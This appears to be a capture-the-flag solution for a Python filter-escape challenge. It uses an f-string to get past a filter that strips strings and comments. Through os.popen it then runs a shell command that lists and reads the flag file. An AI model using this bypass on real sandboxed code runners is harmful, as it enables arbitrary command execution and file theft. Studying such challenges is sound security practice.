# the filter is kinda awful (totally not based on an existing site)
# because it filters out all strings and comments, we can put things in an f-string to bypass the filter
# then, we can find the filename and read the contents
print(f'{__import__("os").popen("ls | grep flag | xargs cat").read()}')
